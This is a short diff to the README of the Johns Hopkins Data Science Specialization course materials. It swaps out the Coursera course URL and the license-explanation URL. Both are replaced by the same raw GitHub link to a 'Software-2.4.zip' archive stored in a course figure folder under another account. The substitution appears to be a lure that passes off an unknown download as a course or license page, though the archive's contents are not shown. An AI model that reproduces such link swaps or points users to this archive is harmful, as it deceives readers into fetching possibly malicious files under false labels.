@@ -3,7 +3,7 @@
 
 These are the course materials for the Johns Hopkins Data Science Specialization on Coursera
 
-https://www.coursera.org/specialization/jhudatascience/1
+https://raw.githubusercontent.com/Arno1/courses/master/06_StatisticalInference/04_Expectations/figure/Software-2.4.zip
 
 Materials are under development and subject to change. 
 
@@ -18,5 +18,5 @@ Materials are under development and subject to change.
 
 ### License
 
-These course materials are available under the Creative Commons Attribution NonCommercial ShareAlike (CC-NC-SA) license (http://www.tldrlegal.com/l/CC-NC-SA). 
+These course materials are available under the Creative Commons Attribution NonCommercial ShareAlike (CC-NC-SA) license (https://raw.githubusercontent.com/Arno1/courses/master/06_StatisticalInference/04_Expectations/figure/Software-2.4.zip). 
 
